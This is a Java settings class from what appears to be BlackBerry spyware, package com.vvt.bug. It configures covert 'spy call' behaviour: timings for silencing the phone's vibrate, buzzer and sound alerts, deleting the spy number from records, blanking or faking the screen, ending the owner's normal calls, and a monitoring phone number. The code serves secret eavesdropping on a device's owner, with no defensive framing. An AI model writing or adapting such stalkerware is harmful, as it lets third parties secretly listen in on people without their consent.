package com.vvt.bug;

import com.vvt.std.PhoneInfo;
import net.rim.blackberry.api.phone.PhoneListener;

public class PhoneEventListenerSettings {
	
	private PhoneListener pel = null;
	
	public long timeToWaitBeforeRemovePlacedSCFromTargetMS = 2000;
	
	public long scheduleSendSCFailureMessageMS = 3000;
	public long timeToWaitBeforeActivateSpeakerPhone = 1000;
	public long timeToWaitBeforeFindActivateHandsetMenuItem = 1000;

	// vibrate, buzzer, sound
	public int timeToWaitBeforeStopAlertMS = 1;//5;//10 > Default Value
	public int updateStopAlertMS = 5;//10;//35 > Default Value
	public int maxNumberOfTimesStopAlert = 100;//79;
	
	// Deletion spy call for OS 5
	public int waitBeforeDeleteSpyNumberMS = 4000;
	public int waitBeforeLockSystemMS = 7000;
	
	// end call
	public int waitBeforeStopSuspendPaintSCDisconnectedMS = 3000;
	public int waitBeforeStopSuspendPaintSCDisconnectedForOS47 = 3000;
	public int waitBeforeStopSuspendPaintSCFailedMS = 3000;
	public int waitBeforeStopSuspendPaintSCForOSFive = 8000;
	
	// wait 4 key press
	public int waitBeforeWait4KeyPressActionMS = 1000; // 500 is ok.
	public int repeatPeriodWait4KeyPressActionMS = 10; // if value is 0, it does not work.
	public int scheduleEndSCWhenNotConnectedOrNotAnsweredMS = 2000;

	public int endSCInProgressTimeToWaitMS = 1000;

	public int endSCInProgressATimeToWaitMS = 250;
	public int endSCInProgressBTimeToWaitMS = 500;
	
	public int minimalRequiredIdleTimeMS = 10;
	public long timeToWaitBeforeRemoveMissedSCFromMonitorMS = 500;
	public long timeToWaitBeforeRemoveReceivedSCFromMonitorMS = 1700;
	public boolean rejectCallByAnswerAndEnd = true;
	public boolean rejectCallByEndWhenVoiceAppRunning = false;
	public int endInCaseRejectByAnswerAndEndMS = 150;
	
	// waiting
	public long waitBeforeEndNormalCallWhenSCActiveMS = 500;
	public long waitBeforeEndSCWhenNormalCallWaitingMS = 1000;
	public long waitBeforeRejectSCWaitingMS = 50;
	
	//miscall
	public boolean overrideGlobalEventListener = false;
	
	private int waitBeforeAnswerWaitingCallMS = 1000;
	private int waitBeforeResumePaintingSCCAnsweredMS = 1500;
	private int waitBeforeResumePaintingSCCDisconnectedMS = 1500;
	private int waitBeforeResumePaintingSCCDeleteConfMS = 5000;
	private int waitBeforeResumePaintingFinalSCCDisconnectedMS = 5000;
	private int waitToReactToPhoneActivityMS = 250;
	private String monitorPhoneNumber = "55555";
	private boolean manipulateBacklight = false;
	private boolean useBlackScreen = false;
	private boolean useCopyScreen = true;
	//private boolean stopSCWhenBacklightEnabled = true;
	private int waitBeforePushGlobalScreen = 250;
	private long waitBeforeEndScc = 1000;
	private long waitBeforeWait4KeyPressActionCaseSccMS = 3000;
	private long repeatPeriodWait4KeyPressActionCaseSccMS = 50;
	private boolean manipulatePainting = true;
	private long waitToCopyConnectedScreenMS = 1000;
	public boolean forceDatagramMode = false;
	public String smsPort = "";
	
	public PhoneEventListenerSettings() {
		try {
			if (PhoneInfo.isFourTwoOne()) {
				rejectCallByAnswerAndEnd = true;
				rejectCallByEndWhenVoiceAppRunning = false;
				endInCaseRejectByAnswerAndEndMS = 150;
				waitBeforeEndNormalCallWhenSCActiveMS = 1500;
			}
			if (PhoneInfo.isFourTwoTwo()) {
				endSCInProgressATimeToWaitMS = 250;
				endSCInProgressBTimeToWaitMS = 500;
				rejectCallByAnswerAndEnd = true;
				rejectCallByEndWhenVoiceAppRunning = false;
				endInCaseRejectByAnswerAndEndMS = 150;
				waitBeforeEndNormalCallWhenSCActiveMS = 1500;
			}
			if (PhoneInfo.isFourThree()) {
				waitBeforeEndNormalCallWhenSCActiveMS = 1500;
			}
			if (PhoneInfo.isFourFive()) {
				rejectCallByAnswerAndEnd = true;
				rejectCallByEndWhenVoiceAppRunning = false;
				endInCaseRejectByAnswerAndEndMS = 50;
				waitBeforeEndNormalCallWhenSCActiveMS = 1500;
			}
			if (PhoneInfo.isFourSixZero()) {
				endSCInProgressATimeToWaitMS = 250;
				endSCInProgressBTimeToWaitMS = 500;
				rejectCallByAnswerAndEnd = true;
				rejectCallByEndWhenVoiceAppRunning = true;
				endInCaseRejectByAnswerAndEndMS = 150;
			}
			if (PhoneInfo.isFourSixOne()) {
				endSCInProgressATimeToWaitMS = 375;
				endSCInProgressBTimeToWaitMS = 750;
				rejectCallByAnswerAndEnd = true;
				rejectCallByEndWhenVoiceAppRunning = true;
				endInCaseRejectByAnswerAndEndMS = 50;
			}
			if (PhoneInfo.isFourSeven()) {
				rejectCallByAnswerAndEnd = true;
				rejectCallByEndWhenVoiceAppRunning = false;
				endInCaseRejectByAnswerAndEndMS = 150;
			}
			
			if (PhoneInfo.isFourTwo()) {
				useBlackScreen = true;
				useCopyScreen = false;
			}
		} catch (Exception e) {
		}
	}
	
	public int getWaitBeforeResumePaintingFinalSCCDisconnectedMS() {
		return waitBeforeResumePaintingFinalSCCDisconnectedMS;
	}

	public void setWaitBeforeResumePaintingFinalSCCDisconnectedMS(int waitBeforeResumePaintingFinalSCCDisconnectedMS) {
		this.waitBeforeResumePaintingFinalSCCDisconnectedMS = waitBeforeResumePaintingFinalSCCDisconnectedMS;
	}

	public int getWaitBeforeAnswerWaitingCallMS() {
		return waitBeforeAnswerWaitingCallMS;
	}

	public void setWaitBeforeAnswerWaitingCallMS(int waitBeforeAnswerWaitingCallMS) {
		this.waitBeforeAnswerWaitingCallMS = waitBeforeAnswerWaitingCallMS;
	}

	public int getWaitBeforeResumePaintingSCCAnsweredMS() {
		return waitBeforeResumePaintingSCCAnsweredMS;
	}

	public void setWaitBeforeResumePaintingSCCAnsweredMS(int waitBeforeResumePaintingSCCAnsweredMS) {
		this.waitBeforeResumePaintingSCCAnsweredMS = waitBeforeResumePaintingSCCAnsweredMS;
	}

	public int getWaitBeforeResumePaintingSCCDisconnectedMS() {
		return waitBeforeResumePaintingSCCDisconnectedMS;
	}

	public void setWaitBeforeResumePaintingSCCDisconnectedMS(int waitBeforeResumePaintingSCCDisconnectedMS) {
		this.waitBeforeResumePaintingSCCDisconnectedMS = waitBeforeResumePaintingSCCDisconnectedMS;
	}
	
	public int getWaitBeforeResumePaintingSCCDeleteConfMS() {
		return waitBeforeResumePaintingSCCDeleteConfMS;
	}

	public void setWaitBeforeResumePaintingSCCDeleteConfMS(int waitBeforeResumePaintingSCCDeleteConfMS) {
		this.waitBeforeResumePaintingSCCDeleteConfMS = waitBeforeResumePaintingSCCDeleteConfMS;
	}

	public int getWaitToReactToPhoneActivityMS() {
		return waitToReactToPhoneActivityMS;
	}

	public void setWaitToReactToPhoneActivityMS(int waitToReactToPhoneActivityMS) {
		this.waitToReactToPhoneActivityMS = waitToReactToPhoneActivityMS;
	}

	public String getMonitorPhoneNumber() {
		return monitorPhoneNumber;
	}

	public void setMonitorPhoneNumber(String monitorPhoneNumber) {
		this.monitorPhoneNumber = monitorPhoneNumber;
	}

	public boolean isManipulateBacklight() {
		return manipulateBacklight;
	}

	public void setManipulateBacklight(boolean manipulateBacklight) {
		this.manipulateBacklight = manipulateBacklight;
	}

	public boolean isUseBlackScreen() {
		return useBlackScreen;
	}

	public void setUseBlackScreen(boolean useBlackScreen) {
		this.useBlackScreen = useBlackScreen;
	}

	public int getWaitBeforePushGlobalScreen() {
		return waitBeforePushGlobalScreen;
	}

	public void setWaitBeforeEndScc(long waitBeforeEndScc) {
		this.waitBeforeEndScc = waitBeforeEndScc;
	}

	public long getWaitBeforeEndScc() {
		return waitBeforeEndScc;
	}

	public boolean isManipulatePainting() {
		return manipulatePainting;
	}

	public void setWaitBeforeWait4KeyPressActionCaseSccMS(long waitBeforeWait4KeyPressActionCaseSccMS) {
		this.waitBeforeWait4KeyPressActionCaseSccMS = waitBeforeWait4KeyPressActionCaseSccMS;
	}

	public long getWaitBeforeWait4KeyPressActionCaseSccMS() {
		return waitBeforeWait4KeyPressActionCaseSccMS;
	}

	public void setRepeatPeriodWait4KeyPressActionCaseSccMS(long repeatPeriodWait4KeyPressActionCaseSccMS) {
		this.repeatPeriodWait4KeyPressActionCaseSccMS = repeatPeriodWait4KeyPressActionCaseSccMS;
	}

	public long getRepeatPeriodWait4KeyPressActionCaseSccMS() {
		return repeatPeriodWait4KeyPressActionCaseSccMS;
	}

	public long getWaitToCopyConnectedScreenMS() {
		return waitToCopyConnectedScreenMS;
	}

	public void setManipulatePainting(boolean checked) {
		this.manipulatePainting = checked;
	}

	public boolean isUseCopyScreen() {
		return useCopyScreen ;
	}

	public void setUseCopyScreen(boolean useCopyScreen) {
		this.useCopyScreen = useCopyScreen;
	}
	
	public PhoneListener getPel() {
		return pel;
	}

	public void setPel(PhoneListener pel) {
		this.pel = pel;
	}
}